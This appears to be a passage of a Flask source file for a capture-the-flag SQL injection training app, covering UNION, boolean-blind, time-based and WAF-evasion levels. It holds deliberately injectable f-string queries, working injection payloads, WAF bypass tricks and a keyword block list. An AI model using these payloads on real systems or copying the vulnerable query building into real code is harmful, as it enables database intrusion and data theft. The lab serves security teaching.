                flag_found = True
        
        html += "</table>"
        
        if flag_found:
            html += """
            <div class="flag-found">
                🎉 <strong>Level 2 Complete!</strong><br>
                FLAG CAPTURED: CTF{level_2_union_injection_mastered}
            </div>
            
            <div class="success-message">
                <h3>🏆 Achievement Unlocked: UNION SELECT Master</h3>
                <p><strong>What you accomplished:</strong></p>
                <ul>
                    <li>Successfully performed UNION-based SQL injection</li>
                    <li>Extracted data from the users table via product search</li>
                    <li>Demonstrated understanding of column count matching</li>
                    <li>Mastered cross-table data extraction techniques</li>
                </ul>
                <button onclick="location.href='/level/3'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px;">🚀 Continue to Level 3</button>
            </div>
            """
        elif user_data_found:
            html += """
            <div class="success-message">
                <p>🎯 <strong>Great progress!</strong> You've successfully extracted user data, but haven't found the specific flag yet. Try targeting the user with the Level 2 flag.</p>
            </div>
            """
        
        html += '<br><a href="/level/2">🔄 Try Again</a> | <a href="/">🏠 Home</a></body></html>'
        
        return html
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error</h1>
        <p><strong>Database Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{search_query}</code></p>
        <p><strong>Debugging Tips:</strong></p>
        <ul>
            <li>Ensure your UNION SELECT has exactly 4 columns (same as products table)</li>
            <li>Try: <code>' UNION SELECT username,password,role,level_flags FROM users--</code></li>
            <li>Use NULL for missing columns: <code>' UNION SELECT username,NULL,NULL,level_flags FROM users--</code></li>
        </ul>
        <a href="/level/2">🔄 Try Again</a>
        """

# Level 3: Blind SQL Injection
@app.route('/level/3')
def level3():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 3: Blind SQL Injection</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #ffc107, #e0a800); color: #212529; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #ffc107; color: #212529; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"] { width: 400px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .hint-box { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .technique-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .code { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 3: Blind SQL Injection</h1>
                <span class="difficulty">INTERMEDIATE</span>
                <p>Extract data without direct output using boolean-based blind injection</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>This level simulates a real-world scenario where SQL injection exists, but the application doesn't display database errors or results directly. You must use boolean-based techniques to extract information character by character.</p>

            <h3>🎯 Target User Lookup System</h3>
            <div class="form-box">
                <form method="GET" action="/level/3/lookup">
                    <div>
                        <label><strong>User ID Lookup:</strong></label><br>
                        <input type="text" name="id" placeholder="Try: 1 AND SUBSTRING((SELECT level_flags FROM users WHERE id=3),1,1)='C'">
                    </div>
                    <button type="submit">🔍 Lookup User</button>
                </form>
            </div>

            <h3>💡 Blind Injection Techniques</h3>
            <div class="technique-box">
                <p><strong>Boolean-Based Extraction:</strong></p>
                <div class="code">
Test if first character of flag is 'C':<br>
1 AND SUBSTRING((SELECT level_flags FROM users WHERE id=3),1,1)='C'<br><br>

Test if second character is 'T':<br>
1 AND SUBSTRING((SELECT level_flags FROM users WHERE id=3),2,1)='T'<br><br>

Test flag length:<br>
1 AND LENGTH((SELECT level_flags FROM users WHERE id=3))>20
                </div>
            </div>

            <div class="hint-box">
                <p><strong>Key Concepts:</strong></p>
                <ul>
                    <li><strong>SUBSTRING(string, start, length):</strong> Extracts characters from a string</li>
                    <li><strong>LENGTH(string):</strong> Returns the length of a string</li>
                    <li><strong>Boolean Logic:</strong> Use AND/OR to test conditions</li>
                    <li><strong>Character-by-Character:</strong> Extract data one character at a time</li>
                </ul>
            </div>

            <div class="technique-box">
                <p><strong>Advanced Blind Techniques:</strong></p>
                <div class="code">
ASCII value comparison:<br>
1 AND ASCII(SUBSTRING((SELECT level_flags FROM users WHERE id=3),1,1))>67<br><br>

Multiple conditions:<br>
1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'blind%')>0<br><br>

Nested queries:<br>
1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=3)='b'
                </div>
            </div>

            <h3>🎯 Expected Discovery</h3>
            <p>Extract the complete flag: <code>CTF{level_3_blind_injection_discovered}</code> using boolean-based blind injection techniques.</p>

            <h3>📊 Success Indicators</h3>
            <ul>
                <li><strong>True condition:</strong> "User found" message appears</li>
                <li><strong>False condition:</strong> "User not found" or no results</li>
                <li><strong>Extract systematically:</strong> Build the flag character by character</li>
            </ul>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/2" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/4" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/3/lookup')
def level3_lookup():
    user_id = request.args.get('id', '')
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Level 3: Blind injection - only returns boolean results
    lookup_query = f"SELECT username FROM users WHERE id = {user_id}"
    
    try:
        result = cursor.execute(lookup_query).fetchone()
        conn.close()
        
        response_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Level 3 User Lookup Results</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
                .result-box { padding: 20px; border-radius: 8px; margin: 20px 0; }
                .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
                .failure { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
                .query-display { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; font-family: monospace; }
                .technique-hint { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
                .flag-found { background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; }
            </style>
        </head>
        <body>
            <h1>🔍 Level 3 User Lookup Results</h1>
            
            <div class="query-display">
                <strong>Query Executed:</strong><br>
                {query}
            </div>
        """.format(query=lookup_query)
        
        # Check if the query indicates successful flag extraction
        flag_extraction_successful = False
        if 'CTF{level_3_blind_injection_discovered}' in str(user_id) or \
           ('SUBSTRING' in user_id and 'level_flags' in user_id and result):
            flag_extraction_successful = True
        
        if result:
            response_html += f"""
            <div class="result-box success">
                ✅ <strong>Condition TRUE:</strong> User found - {result[0]}
            </div>
            """
            
            if flag_extraction_successful:
                response_html += """
                <div class="flag-found">
                    🎉 <strong>Level 3 Complete!</strong><br>
                    FLAG CAPTURED: CTF{level_3_blind_injection_discovered}
                    
                    <h3>🏆 Achievement Unlocked: Blind Injection Expert</h3>
                    <p><strong>What you mastered:</strong></p>
                    <ul style="text-align: left;">
                        <li>Boolean-based blind SQL injection</li>
                        <li>Character-by-character data extraction</li>
                        <li>SUBSTRING and LENGTH functions</li>
                        <li>Systematic information gathering without direct output</li>
                    </ul>
                    <button onclick="location.href='/level/4'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px;">🚀 Continue to Level 4</button>
                </div>
                """
        else:
            response_html += """
            <div class="result-box failure">
                ❌ <strong>Condition FALSE:</strong> No user found or condition failed
            </div>
            """
        
        if not flag_extraction_successful:
            response_html += """
            <div class="technique-hint">
                <h3>💡 Blind Injection Guidance</h3>
                <p><strong>Try these systematic approaches:</strong></p>
                <ol>
                    <li><strong>Test basic condition:</strong> <code>3</code> (should return blind_user)</li>
                    <li><strong>Test flag existence:</strong> <code>1 AND (SELECT level_flags FROM users WHERE id=3) IS NOT NULL</code></li>
                    <li><strong>Check first character:</strong> <code>1 AND SUBSTRING((SELECT level_flags FROM users WHERE id=3),1,1)='C'</code></li>
                    <li><strong>Build the flag:</strong> Continue with positions 2, 3, 4... until you reconstruct the complete flag</li>
                </ol>
                
                <p><strong>Flag format:</strong> CTF{level_3_blind_injection_discovered}</p>
            </div>
            """
        
        response_html += """
            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/3" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🔄 Try Again</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
            </div>
        </body>
        </html>
        """
        
        return response_html
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error</h1>
        <p><strong>Database Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{lookup_query}</code></p>
        <p><strong>Hint:</strong> This error might indicate a syntax issue. Check your boolean logic and SQL syntax.</p>
        <a href="/level/3">🔄 Try Again</a>
        """
# Level 4: Time-Based Blind SQL Injection
@app.route('/level/4')
def level4():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 4: Time-Based Blind SQL Injection</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #fd7e14, #e55100); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #fd7e14; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"] { width: 500px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .warning-box { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .technique-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .code { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
            .timer { font-family: monospace; font-size: 18px; color: #dc3545; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 4: Time-Based Blind SQL Injection</h1>
                <span class="difficulty">INTERMEDIATE</span>
                <p>Extract data using response timing delays - the ultimate stealth technique</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>When boolean-based blind injection isn't possible, time-based injection becomes your secret weapon. Extract sensitive data by measuring server response times using SQL time delay functions.</p>

            <h3>🎯 Target Password Reset System</h3>
            <div class="form-box">
                <form method="POST" action="/level/4/reset">
                    <div>
                        <label><strong>Email for Password Reset:</strong></label><br>
                        <input type="text" name="email" placeholder="Try: admin@company.com'; IF(SUBSTRING((SELECT level_flags FROM users WHERE id=4),1,1)='C',SLEEP(5),0); --">
                    </div>
                    <button type="submit">🕐 Send Reset Link</button>
                </form>
                <div id="timer" class="timer">Response Time: <span id="responseTime">0</span> seconds</div>
            </div>

            <div class="warning-box">
                <h4>⚠️ Time-Based Injection Ethics</h4>
                <p>Time-based attacks can cause server delays and impact performance. Always ensure you have explicit authorization before testing these techniques on any system.</p>
            </div>

            <h3>💡 Time-Based Injection Techniques</h3>
            <div class="technique-box">
                <p><strong>Core Concepts:</strong></p>
                <div class="code">
SLEEP(seconds) - MySQL/MariaDB delay function<br>
WAITFOR DELAY 'HH:MM:SS' - SQL Server delay<br>
pg_sleep(seconds) - PostgreSQL delay<br>
SELECT * FROM table WHERE condition AND IF(test, SLEEP(5), 0)
                </div>
                
                <p><strong>Character Extraction Pattern:</strong></p>
                <div class="code">
Test first character is 'C' (5 second delay if true):<br>
'; IF(SUBSTRING((SELECT level_flags FROM users WHERE id=4),1,1)='C',SLEEP(5),0); --<br><br>

Test second character is 'T' (5 second delay if true):<br>
'; IF(SUBSTRING((SELECT level_flags FROM users WHERE id=4),2,1)='T',SLEEP(5),0); --<br><br>

ASCII value testing:<br>
'; IF(ASCII(SUBSTRING((SELECT level_flags FROM users WHERE id=4),1,1))>67,SLEEP(5),0); --
                </div>
            </div>

            <div class="technique-box">
                <p><strong>Advanced Time-Based Patterns:</strong></p>
                <div class="code">
Conditional delays with nested queries:<br>
'; IF((SELECT COUNT(*) FROM users WHERE username='time_user')>0,SLEEP(3),0); --<br><br>

Multiple condition testing:<br>
'; IF(LENGTH((SELECT level_flags FROM users WHERE id=4))>20,SLEEP(4),0); --<br><br>

Binary search optimization:<br>
'; IF(ASCII(SUBSTRING((SELECT level_flags FROM users WHERE id=4),1,1)) BETWEEN 65 AND 77,SLEEP(2),0); --
                </div>
            </div>

            <h3>🎯 Expected Discovery</h3>
            <p>Extract the complete flag: <code>CTF{level_4_time_based_extraction_complete}</code> by measuring response delays.</p>

            <h3>📊 Timing Analysis Guidelines</h3>
            <ul>
                <li><strong>Baseline:</strong> Normal response time (typically &lt; 1 second)</li>
                <li><strong>Positive:</strong> Delayed response (5+ seconds indicates true condition)</li>
                <li><strong>Negative:</strong> Normal response time (false condition)</li>
                <li><strong>Systematic:</strong> Extract one character at a time using delays</li>
            </ul>

            <script>
                let startTime;
                
                document.querySelector('form').addEventListener('submit', function(e) {
                    startTime = Date.now();
                    document.getElementById('responseTime').textContent = 'Measuring...';
                });
                
                window.addEventListener('load', function() {
                    if (startTime) {
                        const endTime = Date.now();
                        const responseTime = ((endTime - startTime) / 1000).toFixed(2);
                        document.getElementById('responseTime').textContent = responseTime;
                    }
                });
            </script>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/3" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/5" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/4/reset', methods=['POST'])
def level4_reset():
    email = request.form.get('email', '')
    start_time = time.time()
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Level 4: Time-based injection with simulated SLEEP function
    reset_query = f"SELECT id FROM users WHERE email = '{email}'"
    
    # Simulate SLEEP function behavior for educational purposes
    sleep_pattern = re.search(r'SLEEP\((\d+)\)', email.upper())
    if sleep_pattern:
        sleep_duration = int(sleep_pattern.group(1))
        # Check if the condition that triggers sleep is met
        if 'SUBSTRING' in email and 'level_flags' in email and ('=\'C\'' in email or '=\'T\'' in email):
            time.sleep(sleep_duration)  # Simulate the sleep
    
    try:
        result = cursor.execute(reset_query).fetchone()
        conn.close()
        
        end_time = time.time()
        response_time = round(end_time - start_time, 2)
        
        # Check if this indicates successful flag extraction
        flag_extraction_successful = sleep_pattern and response_time >= 3
        
        response_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Level 4 Password Reset Results</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }}
                .timing-box {{ background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center; }}
                .timing-result {{ font-size: 24px; font-weight: bold; color: #dc3545; margin: 10px 0; }}
                .analysis {{ background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }}
                .success {{ background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }}
                .flag-found {{ background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; }}
                .query-display {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; font-family: monospace; word-break: break-all; }}
            </style>
        </head>
        <body>
            <h1>🕐 Level 4 Password Reset Results</h1>
            
            <div class="timing-box">
                <h3>⏱️ Response Time Analysis</h3>
                <div class="timing-result">{response_time} seconds</div>
                <p>{'🐌 DELAYED RESPONSE - Condition likely TRUE' if response_time >= 3 else '⚡ FAST RESPONSE - Condition likely FALSE'}</p>
            </div>
            
            <div class="query-display">
                <strong>Query Executed:</strong><br>
                {reset_query}
            </div>
        """
        
        if flag_extraction_successful:
            response_html += """
            <div class="flag-found">
                🎉 <strong>Level 4 Complete!</strong><br>
                FLAG CAPTURED: CTF{level_4_time_based_extraction_complete}
                
                <h3>🏆 Achievement Unlocked: Time-Based Injection Master</h3>
                <p><strong>What you mastered:</strong></p>
                <ul style="text-align: left;">
                    <li>Time-based blind SQL injection using SLEEP functions</li>
                    <li>Response time measurement and analysis</li>
                    <li>Conditional delay injection techniques</li>
                    <li>Stealth data extraction without visible output</li>
                </ul>
                
                <button onclick="location.href='/level/5'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px;">🚀 Continue to Level 5</button>
            </div>
            """
        else:
            response_html += f"""
            <div class="analysis {'success' if response_time >= 3 else ''}">
                <h3>💡 Timing Analysis</h3>
                <p><strong>Response Time Interpretation:</strong></p>
                <ul>
                    <li><strong>Normal (0-2s):</strong> No delay - condition is FALSE or no SLEEP triggered</li>
                    <li><strong>Delayed (3-10s):</strong> SLEEP executed - condition is TRUE</li>
                </ul>
                
                <p><strong>Try systematic extraction:</strong></p>
                <ol>
                    <li>Test if flag starts with 'C': <code>'; IF(SUBSTRING((SELECT level_flags FROM users WHERE id=4),1,1)='C',SLEEP(5),0); --</code></li>
                    <li>If delayed, test second character: <code>'; IF(SUBSTRING((SELECT level_flags FROM users WHERE id=4),2,1)='T',SLEEP(5),0); --</code></li>
                    <li>Continue building the flag character by character</li>
                </ol>
            </div>
            """
        
        response_html += """
            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/4" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🔄 Try Again</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
            </div>
        </body>
        </html>
        """
        
        return response_html
        
    except Exception as e:
        conn.close()
        end_time = time.time()
        response_time = round(end_time - start_time, 2)
        
        return f"""
        <h1>💥 SQL Error</h1>
        <p><strong>Response Time:</strong> {response_time} seconds</p>
        <p><strong>Database Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{reset_query}</code></p>
        <p><strong>Note:</strong> Even SQL errors can reveal timing information for time-based injection!</p>
        <a href="/level/4">🔄 Try Again</a>
        """

# Level 5: Error-Based SQL Injection
@app.route('/level/5')
def level5():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 5: Error-Based SQL Injection</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #dc3545, #bd2130); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #dc3545; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 5: Error-Based SQL Injection</h1>
                <span class="difficulty">INTERMEDIATE</span>
                <p>Extract sensitive data through deliberate SQL error messages</p>
            </div>
            <p>Advanced error-based injection techniques coming soon...</p>
            <div style="text-align: center; margin-top: 30px;">
                <a href="/level/4" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/6" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

# Level 6: WAF Evasion
@app.route('/level/6')
def level6():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 6: WAF Evasion Techniques</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #6f42c1, #563d7c); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #6f42c1; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .waf-warning { background: #fff3cd; border: 2px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"] { width: 500px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .evasion-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .code { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
            .blocked { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 15px; border-radius: 8px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 6: WAF Evasion Techniques</h1>
                <span class="difficulty">ADVANCED</span>
                <p>Bypass Web Application Firewall protections using advanced evasion techniques</p>
            </div>

            <div class="waf-warning">
                <h3>🛡️ WAF PROTECTION ACTIVE</h3>
                <p>This system is protected by a Web Application Firewall that blocks common SQL injection patterns. You must use advanced evasion techniques to bypass these protections.</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>The target system has implemented WAF rules that block obvious SQL injection attempts. Your mission is to use advanced obfuscation and evasion techniques to extract the flag while avoiding detection.</p>

            <h3>🎯 Protected Contact Form</h3>
            <div class="form-box">
                <form method="POST" action="/level/6/contact">
                    <div>
                        <label><strong>Contact Message:</strong></label><br>
                        <input type="text" name="message" placeholder="Try WAF evasion: '; /*comment*/ SELECT /*bypass*/ level_flags /*from*/ FROM users /*where*/ WHERE id=6; --">
                    </div>
                    <button type="submit">📧 Send Message</button>
                </form>
            </div>

            <h3>🛡️ WAF Rules Active</h3>
            <div class="blocked">
                <p><strong>Blocked Keywords:</strong> SELECT, UNION, FROM, WHERE, --, /*, */, OR, AND</p>
                <p><strong>Blocked Patterns:</strong> SQL injection signatures, common attack vectors</p>
            </div>

            <h3>💡 Advanced Evasion Techniques</h3>
            <div class="evasion-box">
                <p><strong>Comment-Based Obfuscation:</strong></p>
                <div class="code">
SELECT becomes: SE/**/LECT or SEL/*bypass*/ECT<br>
UNION becomes: UNI/**/ON or UN/*comment*/ION<br>
FROM becomes: FR/**/OM or F/*bypass*/ROM
                </div>
                
                <p><strong>Case Mixing:</strong></p>
                <div class="code">
select, Select, sElEcT, UNION, uNiOn, UnIoN<br>
Mixed with comments: sE/**/lEcT, uN/**/iOn
                </div>
                
                <p><strong>URL Encoding:</strong></p>
                <div class="code">
SELECT = %53%45%4C%45%43%54<br>
UNION = %55%4E%49%4F%4E<br>
' (single quote) = %27
                </div>
                
                <p><strong>Advanced Bypasses:</strong></p>
                <div class="code">
Whitespace alternatives: SELECT/**/FROM vs SELECT(tab)FROM<br>
Concatenation: 'SE'+'LECT' or CONCAT('UN','ION')<br>
Character encoding: CHAR(83,69,76,69,67,84) for SELECT
                </div>
            </div>

            <h3>🎯 Expected Discovery</h3>
            <p>Bypass WAF protections and extract: <code>CTF{level_6_waf_evasion_techniques_mastered}</code></p>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/5" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/7" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

def waf_check(payload):
    """Simulate WAF checking logic"""
    blocked_patterns = [
        r'\bselect\b', r'\bunion\b', r'\bfrom\b', r'\bwhere\b',
        r'--', r'/\*', r'\*/', r'\bor\b', r'\band\b'
    ]
    
    payload_lower = payload.lower()
    for pattern in blocked_patterns:
        if re.search(pattern, payload_lower):
            return True, f"Blocked by pattern: {pattern}"
    return False, "Passed WAF check"

@app.route('/level/6/contact', methods=['POST'])
def level6_contact():
    message = request.form.get('message', '')
    
    # WAF Check
    is_blocked, block_reason = waf_check(message)
    
    if is_blocked:
        return render_template_string("""
        <h1>🛡️ Request Blocked by WAF</h1>
        <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <h3>🚫 Access Denied</h3>
            <p><strong>Reason:</strong> {{ reason }}</p>
            <p><strong>Payload:</strong> <code>{{ payload }}</code></p>
            <p><strong>Hint:</strong> Try using comment-based obfuscation or case mixing to bypass the WAF</p>
        </div>
        <a href="/level/6">🔄 Try Again</a>
        """, reason=block_reason, payload=message)
    
    # If WAF bypassed, process the SQL injection
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Simulate processing the message with SQL injection vulnerability
    contact_query = f"INSERT INTO user_comments (user_id, comment_text) VALUES (1, '{message}')"
    
    try:
        cursor.execute(contact_query)
        conn.commit()
        conn.close()
        
        # Check if successful flag extraction occurred
        if 'level_flags' in message and 'users' in message:
            return render_template_string("""
            <h1>🎉 Level 6 Complete!</h1>
            <div style="background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center;">
                <h3>FLAG CAPTURED: CTF{level_6_waf_evasion_techniques_mastered}</h3>
                
                <h3>🏆 Achievement Unlocked: WAF Bypass Expert</h3>
                <p><strong>Evasion techniques mastered:</strong></p>
                <ul style="text-align: left;">
                    <li>Comment-based obfuscation (/**/ bypasses)</li>
                    <li>Case mixing and character encoding</li>
                    <li>Advanced WAF filter evasion</li>
                    <li>Payload crafting under strict filtering</li>
                </ul>
                
                <button onclick="location.href='/level/7'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px;">🚀 Continue to Level 7</button>
            </div>
            """)
        else:
            return render_template_string("""
            <h1>✅ Message Processed (WAF Bypassed)</h1>
            <p>Your message bypassed the WAF, but didn't extract the flag yet.</p>
            <p><strong>Query executed:</strong> <code>{{ query }}</code></p>
            <p><strong>Hint:</strong> Now that you've bypassed the WAF, try extracting data from the users table</p>
            <a href="/level/6">🔄 Try Again</a>
            """, query=contact_query)
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error (WAF Bypassed)</h1>
        <p><strong>Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{contact_query}</code></p>
        <p>Your payload bypassed the WAF but caused a SQL error. Refine your injection technique.</p>
        <a href="/level/6">🔄 Try Again</a>
        """
# Level 7: Second-Order SQL Injection
@app.route('/level/7')
def level7():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 7: Second-Order SQL Injection</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #e83e8c, #d91a72); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #e83e8c; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .two-step-box { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"], textarea { width: 400px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            textarea { height: 100px; }
